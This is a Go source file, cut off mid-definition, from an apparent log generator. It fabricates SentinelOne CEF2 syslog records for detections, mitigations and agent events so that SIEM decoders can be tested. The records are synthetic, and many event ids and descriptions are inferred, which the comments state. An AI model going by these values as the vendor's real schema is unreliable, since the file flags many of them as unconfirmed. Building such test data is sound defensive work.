package catalog

import (
	"fmt"
	"strings"
	"time"

	"github.com/theshahrukh98khan/LogGen/internal/core"
)

// SentinelOne Singularity (EDR/XDR) controls.
//
// # Which format this is, and why
//
// SentinelOne exposes three ways to get events out of the Management console:
// the Management API (JSON, pulled), Cloud Funnel / Deep Visibility (JSON,
// streamed to a bucket or Kafka topic), and the built-in Syslog integration
// (pushed over UDP/TCP). Only the Syslog integration lands in a Wazuh manager's
// syslog listener without a collector in between, so that is what is modelled
// here. The Management API JSON is a pull-based integration that would need a
// wodle or an external script, not a syslog decoder.
//
// The Syslog integration emits CEF. There are two flavours in the wild:
//
//   - The older one, still visible in Rapid7's and LogRhythm's captures, is
//     standard CEF with a proper seven-field pipe header:
//     CEF:0|SentinelOne|Mgmt|OS X|2009|Quarantine failed|1|k=v k=v ...
//   - The current one, which SentinelOne labels CEF2, opens with
//     CEF:2|SentinelOne|Mgmt| and then abandons CEF entirely: every remaining
//     field is a key=value pair and the separator is a pipe, not a space.
//     There is no signature-id / name / severity header triplet; eventID,
//     eventDesc and eventSeverity appear as ordinary key=value pairs somewhere
//     in the middle of the line.
//
// These controls implement CEF2, because that is what recent real-world
// captures from Wazuh, Graylog and Cyderes deployments show arriving. It is
// also the reason a stock CEF decoder fails on SentinelOne: the line is not
// valid CEF after the third pipe. A decoder written against these records has
// to key on the literal "CEF:2|SentinelOne|Mgmt|" and then split on pipes.
//
// # The syslog framing
//
// SentinelOne's own writer prefixes the CEF payload with a Python-logging
// preamble before handing it to syslog, so what actually reaches a relay is:
//
//	<14>2022-10-06 10:36:04,350 sentinel - CEF:2|SentinelOne|Mgmt|...
//
// and what reaches Wazuh after a relay has stamped its own RFC 3164 header is:
//
//	Oct  6 10:36:04 2022-10-06 10:36:04,350 sentinel - CEF:2|SentinelOne|Mgmt|...
//
// That double timestamp is not a mistake, it is what the product sends, and it
// is the thing that breaks naive decoders. These records therefore carry the
// "<date> sentinel - " preamble inside the message and leave the outer syslog
// header to LogGen's sender, which reproduces the second form above.
//
// # Sources
//
// Verbatim CEF2 line with the full field set (threat, agent, site, account and
// mitigation blocks), used to fix field names and order:
//
//	https://docs.cyderes.cloud/parser-knowledge-base/sentinel_edr/
//
// Real deployment captures confirming the CEF:2 shape and the "sentinel -"
// preamble:
//
//	https://groups.google.com/g/wazuh/c/gQ9x73-tJV4
//	https://community.graylog.org/t/help-parse-cef2-logs-sentinelone/24730
//
// Older CEF:0 captures, used for activity-type ids 19, 21 and 2009 and for the
// eventDesc wording:
//
//	https://docs.rapid7.com/insightidr/sentinelone/
//	https://docs.logrhythm.com/devices/docs/syslog-sentinelone-cef
//
// Activity-type ids cross-checked against:
//
//	https://github.com/utmstack/UTMStack/issues/2711
//	https://github.com/SEKOIA-IO/intake-formats (SentinelOne parser.yml)
//
// # Confirmed
//
//   - The "CEF:2|SentinelOne|Mgmt|" opener and the pipe-separated key=value
//     body, from three independent captures.
//   - The field names and their order in a threat-management record, from the
//     Cyderes sample: suser, fileName, oldValue, newValue, rt, deviceAddress,
//     deviceHostFqdn, deviceHostName, notificationScope, siteId, siteName,
//     accountId, accountName, vendor, eventID, eventDesc, eventSeverity,
//     originatorName, originatorVersion, sourceAgentLastActivityTimestamp,
//     sourceAgentRegisterTimestamp, sourceNetworkState, sourceOsRevision,
//     sourceOsType, sourceAgentUuid, sourceFqdn, sourceThreatCount,
//     sourceMgmtPrecievedAddress, sourceDnsDomain, sourceHostName,
//     sourceUserName, sourceUserId, sourceAgentId, sourceGroupId,
//     sourceGroupName, sourceIpAddresses, sourceMacAddresses,
//     threatClassification, threatClassificationSource, threatDetectingEngine,
//     threatClassifier, threatMitigationStatus, threatConfidenceLevel,
//     threatMitigatedPreemptively, threatMitigationStatusLabel,
//     threatMitigationStatusID, threatCommandLineArguments, threatID,
//     threatStoryline, threatDetectionTime, threatIndicatorsList,
//     threatProcessUser, fileHashSha256, fileHashMd5, cat, activityID,
//     activityType.
//   - sourceMgmtPrecievedAddress really is spelled that way in the product.
//     It is reproduced verbatim; correcting it would break a real decoder.
//   - sourceIpAddresses and sourceMacAddresses are emitted as Python list
//     literals, e.g. ['10.3.205.127', 'fe80::19dc:cd68:a2fc:4b23'], and
//     threatIndicatorsList as [88, 293]. Also reproduced verbatim.
//   - rt and the other timestamps are "2006-01-02 15:04:05.000000" with no
//     zone. cat=THREATMANAGEMENT on threat records.
//   - Every public sample, CEF:0 and CEF:2 alike, carries eventSeverity=1
//     regardless of how serious the event is, so these do too. Severity lives
//     in the syslog PRI, not in this field.
//   - activityID and activityType duplicate the record id and the eventID.
//   - Activity-type ids: 19 (New active threat), 21 (Threat marked as
//     resolved), 2001 (Agent killed the threat), 2004 (Agent quarantined the
//     threat), 2009 (Quarantine failed), 2030 (Analyst verdict changed), 4003
//     (New Suspicious threat detected), 4008 (Threat status changed), 5126
//     (Device Control connected USB), 90/91/92 (full disk scan started /
//     aborted / completed), 25 (Console user deleted), 27 (Console user
//     logged in).
//
// # NOT confirmed - read this before writing a decoder
//
//   - SentinelOne does not publish its activity-type table. Every id used
//     below that is not in the confirmed list above is INFERRED and should be
//     replaced with the real value before a production rule keys on it. The
//     inferred ids are: 24, 26, 1002 (console user management and API tokens),
//     2005, 2006, 2010 (remediate, rollback, network quarantine), 3001, 3002,
//     3003, 3010 (exclusions, blocklist, policy), 3510, 3602, 3603, 3608
//     (tamper, offline, decommission, uninstall), 3700, 3701, 3702 (STAR
//     custom-rule alerts) and 5127 (device control block). 3608 does appear in
//     public SentinelOne activity logs, but the description attached to it
//     here is inferred.
//   - The eventDesc wording for those same events is inferred from console
//     terminology, not quoted from a capture. The wording for 19, 2009, 2030
//     and 5126 is quoted.
//   - originatorName: the one public sample has it redacted. "Agent" and
//     "Mgmt" below are inferred.
//   - cat values other than THREATMANAGEMENT (SYSTEM, DEVICECONTROL,
//     USERMANAGEMENT, POLICY, STAR below) are inferred. The CEF:0 captures
//     show cat=SystemEvent, which suggests CEF2 uses a different vocabulary,
//     but no non-threat CEF2 capture was reachable.
//   - Whether SentinelOne escapes a pipe appearing inside a value is unknown;
//     no sample contained one. These records escape it as \| so the line stays
//     splittable.
//   - Deep Visibility telemetry itself does not traverse this syslog channel.
//     What does reach it is a STAR custom-rule alert carrying process and
//     network detail, which is what the Deep Visibility group below models.
//     Raw process and DNS events need Cloud Funnel or the Deep Visibility API.
//   - Console-scope records here reuse the same agent block as endpoint
//     records, filled with the console host. No capture of a CEF2 console
//     audit event was reachable, so whether SentinelOne leaves the source*
//     fields empty on those is unknown.
//   - Wazuh ships no SentinelOne ruleset, so no rule ids are claimed.

const (
	s1CEFOpener   = "CEF:2|SentinelOne|Mgmt|"
	s1ConsoleHost = "sentinelone"
	// The logger name SentinelOne's syslog writer puts in its own preamble.
	s1LoggerName = "sentinel"
	// Every public sample carries this, whatever the event.
	s1EventSeverity = "1"
)

// s1Esc protects the one character that would break a CEF2 line: the pipe,
// which is the field separator. Backslashes are deliberately left alone: the
// vendor sample carries threatProcessUser=DOMAIN\first.last and a filePath
// full of single, unescaped backslashes, so doubling them here would not match
// what a decoder actually sees. Newlines are removed rather than escaped,
// because the record has to stay one syslog message.
//
// Whether the product escapes a pipe appearing inside a value is unknown; no
// public sample contained one. These records escape it so the line stays
// splittable.
func s1Esc(s string) string {
	s = strings.ReplaceAll(s, "|", `\|`)
	s = strings.ReplaceAll(s, "\n", " ")
	return strings.ReplaceAll(s, "\r", "")
}

// s1KV renders one key=value field.
func s1KV(k, v string) string { return k + "=" + s1Esc(v) }

// s1Time is the timestamp shape SentinelOne uses for rt and every other
// timestamp field: microsecond precision, no zone.
func s1Time(t time.Time) string { return t.Format("2006-01-02 15:04:05.000000") }

// s1Record assembles the CEF2 line and the preamble SentinelOne's own writer
// prepends to it. The preamble uses a comma before the milliseconds, which is
// Python logging's default and is exactly what shows up in real captures.
func s1Record(c *core.Ctx, fields []string) string {
	return c.Now.Format("2006-01-02 15:04:05,000") + " " + s1LoggerName + " - " +
		s1CEFOpener + strings.Join(fields, "|")
}

// s1ID produces one of SentinelOne's 18-digit snowflake identifiers.
func s1ID(c *core.Ctx) string {
	return fmt.Sprintf("%d%09d", c.Int(100000000, 999999999), c.Int(0, 999999999))
}

// s1Agent is one endpoint's identity. Every value a record repeats is
// generated once here, because generating a hostname or an agent id twice is
// how a record ends up referring to two different machines.
type s1Agent struct {
	Host       string
	FQDN       string
	User       string
	DomainUser string
	IP         string
	MAC        string
	UUID       string
	AgentID    string
	GroupID    string
	GroupName  string
	OsType     string
	OsRevision string
	Version    string
	NetState   string
	UserID     string
}

func s1NewAgent(c *core.Ctx, host, user string) s1Agent {
	return s1Agent{
		Host:       host,
		FQDN:       strings.ToLower(host) + "." + c.Env.Domain,
		User:       user,
		DomainUser: c.Env.NetBIOS + `\` + user,
		IP:         c.InternalIP(),
		MAC:        c.MAC(),
		UUID:       strings.Trim(c.GUID(), "{}"),
		AgentID:    s1ID(c),
		GroupID:    s1ID(c),
		GroupName:  c.Pick("Default Group", "Workstations", "Servers", "Remote Users"),
		OsType:     "windows",
		OsRevision: c.Pick("19045", "22621", "17763", "20348"),
		Version:    c.Pick("23.4.2.350", "22.3.3.418", "24.1.4.257"),
		NetState:   "connected",
		UserID:     c.UserSID(user),
	}
}

// s1Common is the agent, site and account block that every CEF2 record
// carries, in the order the vendor sample shows it.
func s1Common(c *core.Ctx, a s1Agent, eventID int, eventDesc, originator string) []string {
	return []string{
		s1KV("rt", s1Time(c.Now)),
		s1KV("deviceAddress", a.IP),
		s1KV("deviceHostFqdn", a.FQDN),
		s1KV("deviceHostName", a.Host),
		s1KV("notificationScope", "SITE"),
		s1KV("siteId", s1ID(c)),
		s1KV("siteName", "Default site"),
		s1KV("accountId", s1ID(c)),
		s1KV("accountName", c.Env.NetBIOS),
		s1KV("vendor", "SentinelOne"),
		s1KV("eventID", fmt.Sprint(eventID)),
		s1KV("eventDesc", eventDesc),
		s1KV("eventSeverity", s1EventSeverity),
		s1KV("originatorName", originator),
		s1KV("originatorVersion", a.Version),
		s1KV("sourceAgentLastActivityTimestamp", s1Time(c.Now.Add(-time.Duration(c.Int(5, 300))*time.Second))),
		s1KV("sourceAgentRegisterTimestamp", s1Time(c.Now.Add(-time.Duration(c.Int(30, 400))*24*time.Hour))),
		s1KV("sourceNetworkState", a.NetState),
		s1KV("sourceOsRevision", a.OsRevision),
		s1KV("sourceOsType", a.OsType),
		s1KV("sourceAgentUuid", a.UUID),
		s1KV("sourceFqdn", a.FQDN),
		s1KV("sourceThreatCount", fmt.Sprint(c.Int(0, 4))),
		s1KV("sourceMgmtPrecievedAddress", c.ExternalIP()),
		s1KV("sourceDnsDomain", strings.ToUpper(c.Env.NetBIOS)),
		s1KV("sourceHostName", a.Host),
		s1KV("sourceUserName", a.User),
		s1KV("sourceUserId", a.UserID),
		s1KV("sourceAgentId", a.AgentID),
		s1KV("sourceGroupId", a.GroupID),
		s1KV("sourceGroupName", a.GroupName),
		s1KV("sourceIpAddresses", "['"+a.IP+"', 'fe80::"+c.HexLower(4)+":"+c.HexLower(4)+":"+c.HexLower(4)+":"+c.HexLower(4)+"']"),
		s1KV("sourceMacAddresses", "['"+strings.ToLower(a.MAC)+"']"),
	}
}

// s1Threat is the threat block. mitStatus / mitLabel / mitID travel together:
// the sample pairs marked_as_benign with suspicious_resolved and id 5, so they
// are passed as one triple rather than generated apart.
type s1Threat struct {
	Classification string
	Source         string
	Engine         string
	Classifier     string
	MitStatus      string
	MitLabel       string
	MitID          string
	Confidence     string
	Preemptive     string
	CmdLine        string
	ID             string
	Storyline      string
	DetectedAt     string
	Indicators     string
	ProcessUser    string
	Sha256         string
	Md5            string
}

func s1ThreatFields(t s1Threat) []string {
	return []string{
		s1KV("threatClassification", t.Classification),
		s1KV("threatClassificationSource", t.Source),
		s1KV("threatDetectingEngine", t.Engine),
		s1KV("threatClassifier", t.Classifier),
		s1KV("threatMitigationStatus", t.MitStatus),
		s1KV("threatConfidenceLevel", t.Confidence),
		s1KV("threatMitigatedPreemptively", t.Preemptive),
		s1KV("threatMitigationStatusLabel", t.MitLabel),
		s1KV("threatMitigationStatusID", t.MitID),
		s1KV("threatCommandLineArguments", t.CmdLine),
		s1KV("threatID", t.ID),
		s1KV("threatStoryline", t.Storyline),
		s1KV("threatDetectionTime", t.DetectedAt),
		s1KV("threatIndicatorsList", t.Indicators),
		s1KV("threatProcessUser", t.ProcessUser),
		s1KV("fileHashSha256", t.Sha256),
		s1KV("fileHashMd5", t.Md5),
	}
}

// s1Tail closes every record: the category and the two activity fields, which
// repeat the record id and the event id.
func s1Tail(c *core.Ctx, cat string, eventID int) []string {
	return []string{
		s1KV("cat", cat),
		s1KV("activityID", s1ID(c)),
		s1KV("activityType", fmt.Sprint(eventID)),
	}
}

func s1Payload(c *core.Ctx, severity int, msg string) core.Payload {
	return core.Payload{
		Kind: core.SourceSentinelOne,
		// No syslog tag: the record already carries SentinelOne's own
		// "<date> sentinel - " preamble, and a tag would put a second program
		// name in front of it.
		Host: s1ConsoleHost,
		// The public captures show PRI values 11, 12 and 14, all of which are
		// facility 1 (user).
		Facility: core.FacUser,
		Severity: severity,
		Message:  msg,
	}
}

// s1Join flattens the field groups in order.
func s1Join(groups ...[]string) []string {
	var out []string
	for _, g := range groups {
		out = append(out, g...)
	}
	return out
}

var (
	pS1Endpoint = param("host", "Endpoint", "auto")
	pS1Threat   = param("threat", "Threat file name", "auto")
)

func init() {
	registerSentinelOneThreats()
	registerSentinelOneMitigation()
	registerSentinelOneAgentHealth()
	registerSentinelOnePolicy()
	registerSentinelOneDeepVisibility()
	registerSentinelOneAudit()
	registerSentinelOneDeviceControl()
}

// ---------------------------------------------------------------------------
// Threat detection
// ---------------------------------------------------------------------------

// s1DetectionBuild is the shared body of the detection controls. They differ
// only in classification, engine, confidence and the file involved, so the
// record assembly lives in one place and a mismatched pair cannot creep into
// one of them.
func s1DetectionBuild(classification, confidence, engine, classifier, source string,
	eventID int, descPrefix string, files []string) func(*core.Ctx) core.Payload {

	return func(c *core.Ctx) core.Payload {
		host := c.P("host", c.Workstation())
		user := c.P("user", c.User())
		a := s1NewAgent(c, host, user)

		file := c.P("threat", c.PickFrom(files))
		path := `\Device\HarddiskVolume3\Users\` + user + `\Downloads\` + file
		sha1 := c.HexLower(40)
		detected := c.Now.Add(-time.Duration(c.Int(2, 90)) * time.Second)

		desc := descPrefix + " - machine " + host
		t := s1Threat{
			Classification: classification,
			Source:         source,
			Engine:         engine,
			Classifier:     classifier,
			MitStatus:      "not_mitigated",
			MitLabel:       "not_mitigated",
			MitID:          "0",
			Confidence:     confidence,
			Preemptive:     "False",
			CmdLine:        path,
			ID:             s1ID(c),
			Storyline:      strings.ToUpper(c.HexLower(16)),
			DetectedAt:     s1Time(detected),
			Indicators:     fmt.Sprintf("[%d, %d]", c.Int(20, 400), c.Int(20, 400)),
			ProcessUser:    a.DomainUser,
			Sha256:         c.HexLower(64),
			Md5:            c.HexLower(32),
		}

		fields := s1Join(
			[]string{
				s1KV("fileHash", sha1),
				s1KV("filePath", path),
				s1KV("fileName", file),
			},
			s1Common(c, a, eventID, desc, "Agent"),
			s1ThreatFields(t),
			s1Tail(c, "THREATMANAGEMENT", eventID),
		)
		return s1Payload(c, core.SevCrit, s1Record(c, fields))
	}
}

func registerSentinelOneThreats() {
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-malware", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "New active threat - malware",
			Desc:    "Static AI flagged an executable as malicious and raised a new active threat. Confidence level malicious, classification Malware.",
			EventID: "19", Channel: "THREATMANAGEMENT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1204.002", "T1059"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1DetectionBuild("Malware", "malicious", "windows.executables", "STATIC", "Cloud",
			19, "New active threat",
			[]string{"invoice_2024.exe", "setup_x64.exe", "AnyDesk_update.exe", "rundll32_shim.exe"}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-ransomware", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "New active threat - ransomware",
			Desc:    "Behavioural AI identified encryption behaviour and classified the threat as Ransomware. This is the one that should page someone.",
			EventID: "19", Channel: "THREATMANAGEMENT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1486", "T1490"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1DetectionBuild("Ransomware", "malicious", "behavioral", "BEHAVIORAL", "Engine",
			19, "New active threat",
			[]string{"lockbit3.exe", "svhost32.exe", "encrypt_all.exe"}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-suspicious", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "New suspicious threat",
			Desc:    "A detection at confidence level suspicious rather than malicious. In Detect-only policy these accumulate without mitigation, which is what makes them worth a rule.",
			EventID: "4003", Channel: "THREATMANAGEMENT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1059.001"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1DetectionBuild("Generic.Heuristic", "suspicious", "windows.executables", "LOGIC", "Cloud",
			4003, "New Suspicious threat detected",
			[]string{"SourceTree.exe", "helper.exe", "toolset.exe"}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-pua", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "Potentially unwanted application",
			Desc:    "A PUA detection: remote access tooling, crackers and bundled adware. Low on its own, useful as a precursor next to a lateral movement alert.",
			EventID: "4003", Channel: "THREATMANAGEMENT", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1219"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1DetectionBuild("PUA", "suspicious", "reputation", "STATIC", "Cloud",
			4003, "New Suspicious threat detected",
			[]string{"ScreenConnect.ClientSetup.exe", "keygen.exe", "advanced_ip_scanner.exe", "nssm.exe"}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-lateral-movement", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "Lateral movement tooling detected",
			Desc:    "A hacktool used to move between hosts: PsExec, WMI execution or an SMB relay. Classification value is inferred, see the package comment.",
			EventID: "19", Channel: "THREATMANAGEMENT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1021.002", "T1570", "T1047"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1DetectionBuild("Lateral Movement", "malicious", "behavioral", "BEHAVIORAL", "Engine",
			19, "New active threat",
			[]string{"psexesvc.exe", "wmiexec.py.exe", "smbexec.exe", "PAExec.exe"}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-credential-dumper", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "Credential dumping tool detected",
			Desc:    "A hacktool that reads LSASS or the SAM hive. Treat as credential access in progress, not as a file to quarantine and forget.",
			EventID: "19", Channel: "THREATMANAGEMENT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1003.001", "T1003.002"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1DetectionBuild("Hacktool", "malicious", "windows.executables", "STATIC", "Cloud",
			19, "New active threat",
			[]string{"mimikatz.exe", "procdump64.exe", "nanodump.exe", "sekurlsa.exe"}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-exploit", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "Exploitation attempt detected",
			Desc:    "The exploitation engine flagged an application being driven into executing attacker-supplied code.",
			EventID: "19", Channel: "THREATMANAGEMENT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1203", "T1055"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1DetectionBuild("Exploit", "malicious", "penetration", "BEHAVIORAL", "Engine",
			19, "New active threat",
			[]string{"WINWORD.EXE", "OUTLOOK.EXE", "AcroRd32.exe"}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-threat-status-changed", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "Threat status changed",
			Desc:    "The mitigation status of an existing threat moved, for example from Not mitigated to Mitigated.",
			EventID: "4008", Channel: "THREATMANAGEMENT", Severity: core.SevLabelMedium,
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			file := c.Pick("invoice_2024.exe", "svhost32.exe", "mimikatz.exe")

			t := s1Threat{
				Classification: "Malware", Source: "Cloud",
				Engine: "windows.executables", Classifier: "STATIC",
				MitStatus: "mitigated", MitLabel: "mitigated", MitID: "3",
				Confidence: "malicious", Preemptive: "False",
				CmdLine: "", ID: s1ID(c),
				Storyline:   strings.ToUpper(c.HexLower(16)),
				DetectedAt:  s1Time(c.Now.Add(-time.Duration(c.Int(60, 3600)) * time.Second)),
				Indicators:  fmt.Sprintf("[%d, %d]", c.Int(20, 400), c.Int(20, 400)),
				ProcessUser: a.DomainUser, Sha256: c.HexLower(64), Md5: c.HexLower(32),
			}
			fields := s1Join(
				[]string{
					s1KV("fileName", file),
					s1KV("oldValue", "Not mitigated"),
					s1KV("newValue", "Mitigated"),
				},
				s1Common(c, a, 4008, "Threat status changed", "Mgmt"),
				s1ThreatFields(t),
				s1Tail(c, "THREATMANAGEMENT", 4008),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})

	// This one is modelled directly on the verbatim vendor sample.
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-analyst-verdict-changed", Source: core.SourceSentinelOne,
			Group: "Threat detection", Name: "Analyst verdict changed",
			Desc:    "An analyst reclassified a threat, typically to False positive, which marks it benign and stops further mitigation. Worth watching: it is the quiet way a real detection gets buried.",
			EventID: "2030", Channel: "THREATMANAGEMENT", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{pUser, pS1Endpoint, param("verdict", "New verdict", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			verdict := c.P("verdict", c.Pick("False positive", "Suspicious", "True positive", "Undefined"))
			file := c.Pick("SourceTree.exe", "mimikatz.exe", "advanced_ip_scanner.exe")

			t := s1Threat{
				Classification: "Generic.Heuristic", Source: "Cloud",
				Engine: "windows.executables", Classifier: "LOGIC",
				MitStatus: "marked_as_benign", MitLabel: "suspicious_resolved", MitID: "5",
				Confidence: "suspicious", Preemptive: "False",
				CmdLine: "", ID: s1ID(c),
				Storyline:   strings.ToUpper(c.HexLower(16)),
				DetectedAt:  s1Time(c.Now.Add(-time.Duration(c.Int(300, 7200)) * time.Second)),
				Indicators:  fmt.Sprintf("[%d, %d]", c.Int(20, 400), c.Int(20, 400)),
				ProcessUser: a.DomainUser, Sha256: "None", Md5: "None",
			}
			fields := s1Join(
				[]string{
					s1KV("suser", c.AdminUser()),
					s1KV("fileName", file),
					s1KV("oldValue", "Undefined"),
					s1KV("newValue", verdict),
				},
				s1Common(c, a, 2030, "Analyst verdict changed", "Mgmt"),
				s1ThreatFields(t),
				s1Tail(c, "THREATMANAGEMENT", 2030),
			)
			return s1Payload(c, core.SevNotice, s1Record(c, fields))
		},
	})
}

// ---------------------------------------------------------------------------
// Mitigation
// ---------------------------------------------------------------------------

// s1MitigationBuild renders a mitigation outcome. action is the console verb,
// status/label/id are the triple the threat block carries.
func s1MitigationBuild(eventID int, desc, status, label, statusID string, failed bool) func(*core.Ctx) core.Payload {
	return func(c *core.Ctx) core.Payload {
		host := c.P("host", c.Workstation())
		user := c.P("user", c.User())
		a := s1NewAgent(c, host, user)

		// The file and its classification are one choice: a record calling
		// mimikatz.exe Ransomware is worse than no record at all.
		samples := [][2]string{
			{"invoice_2024.exe", "Malware"},
			{"lockbit3.exe", "Ransomware"},
			{"mimikatz.exe", "Hacktool"},
			{"update.latgjkr", "Malware"},
		}
		sample := samples[c.Int(0, len(samples)-1)]
		file := c.P("threat", sample[0])
		path := `\Device\HarddiskVolume3\Users\` + user + `\Downloads\` + file
		sha1 := c.HexLower(40)

		t := s1Threat{
			Classification: sample[1],
			Source:         "Cloud",
			Engine:         "windows.executables",
			Classifier:     "STATIC",
			MitStatus:      status,
			MitLabel:       label,
			MitID:          statusID,
			Confidence:     "malicious",
			Preemptive:     "False",
			CmdLine:        path,
			ID:             s1ID(c),
			Storyline:      strings.ToUpper(c.HexLower(16)),
			DetectedAt:     s1Time(c.Now.Add(-time.Duration(c.Int(2, 120)) * time.Second)),
			Indicators:     fmt.Sprintf("[%d, %d]", c.Int(20, 400), c.Int(20, 400)),
			ProcessUser:    a.DomainUser,
			Sha256:         c.HexLower(64),
			Md5:            c.HexLower(32),
		}
		fields := s1Join(
			[]string{
				s1KV("fileHash", sha1),
				s1KV("filePath", path),
				s1KV("fileName", file),
			},
			s1Common(c, a, eventID, desc, "Agent"),
			s1ThreatFields(t),
			s1Tail(c, "THREATMANAGEMENT", eventID),
		)
		sev := core.SevWarning
		if failed {
			sev = core.SevErr
		}
		return s1Payload(c, sev, s1Record(c, fields))
	}
}

func registerSentinelOneMitigation() {
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-mitigation-kill", Source: core.SourceSentinelOne,
			Group: "Mitigation", Name: "Agent killed the threat",
			Desc:    "The agent terminated the malicious process. Confirmed activity type 2001.",
			EventID: "2001", Channel: "THREATMANAGEMENT", Severity: core.SevLabelHigh,
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1MitigationBuild(2001, "Agent killed the threat", "mitigated", "killed", "3", false),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-mitigation-quarantine", Source: core.SourceSentinelOne,
			Group: "Mitigation", Name: "Agent quarantined the threat",
			Desc:    "The file was moved into quarantine. Confirmed activity type 2004.",
			EventID: "2004", Channel: "THREATMANAGEMENT", Severity: core.SevLabelHigh,
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1MitigationBuild(2004, "Agent quarantined the threat", "mitigated", "quarantined", "3", false),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-mitigation-quarantine-failed", Source: core.SourceSentinelOne,
			Group: "Mitigation", Name: "Quarantine failed",
			Desc:    "Mitigation did not complete: the file is still on disk. A failed mitigation on a malicious verdict is an incident, not a warning.",
			EventID: "2009", Channel: "THREATMANAGEMENT", Severity: core.SevLabelCritical,
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1MitigationBuild(2009, "Quarantine failed", "not_mitigated", "mitigation_failed", "0", true),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-mitigation-remediate", Source: core.SourceSentinelOne,
			Group: "Mitigation", Name: "Agent remediated the threat",
			Desc:    "Remediation undid the changes the threat made: files, registry keys and scheduled tasks. Activity type inferred.",
			EventID: "2005", Channel: "THREATMANAGEMENT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1547.001"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1MitigationBuild(2005, "Agent remediated the threat", "mitigated", "remediated", "3", false),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-mitigation-rollback", Source: core.SourceSentinelOne,
			Group: "Mitigation", Name: "Agent rolled back the threat",
			Desc:    "Rollback restored files from VSS after an encryption event. Its presence means ransomware actually ran. Activity type inferred.",
			EventID: "2006", Channel: "THREATMANAGEMENT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1486"},
			Params: []core.Param{pUser, pS1Endpoint, pS1Threat},
		},
		Build: s1MitigationBuild(2006, "Agent rolled back the threat", "mitigated", "rolled_back", "3", false),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-mitigation-network-quarantine", Source: core.SourceSentinelOne,
			Group: "Mitigation", Name: "Endpoint disconnected from network",
			Desc:    "Network quarantine: the agent cut the host off from everything except the console. Activity type inferred.",
			EventID: "2010", Channel: "SYSTEM", Severity: core.SevLabelHigh,
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			a.NetState = "disconnecting"
			by := c.AdminUser()
			fields := s1Join(
				[]string{
					s1KV("suser", by),
					s1KV("oldValue", "connected"),
					s1KV("newValue", "disconnected"),
				},
				s1Common(c, a, 2010, "Agent "+host+" disconnected from network", "Mgmt"),
				s1Tail(c, "SYSTEM", 2010),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})
}

// ---------------------------------------------------------------------------
// Agent health and tampering
// ---------------------------------------------------------------------------

// s1AgentEventBuild renders an agent lifecycle record: no threat block, an
// optional acting console user, and a description that names the host.
func s1AgentEventBuild(eventID int, descFmt, originator string, netState string,
	lead func(c *core.Ctx, host, user string) []string, sev int) func(*core.Ctx) core.Payload {

	return func(c *core.Ctx) core.Payload {
		host := c.P("host", c.Workstation())
		user := c.P("user", c.User())
		a := s1NewAgent(c, host, user)
		if netState != "" {
			a.NetState = netState
		}
		var leadFields []string
		if lead != nil {
			leadFields = lead(c, host, user)
		}
		fields := s1Join(
			leadFields,
			s1Common(c, a, eventID, fmt.Sprintf(descFmt, host), originator),
			s1Tail(c, "SYSTEM", eventID),
		)
		return s1Payload(c, sev, s1Record(c, fields))
	}
}

func registerSentinelOneAgentHealth() {
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-agent-tamper", Source: core.SourceSentinelOne,
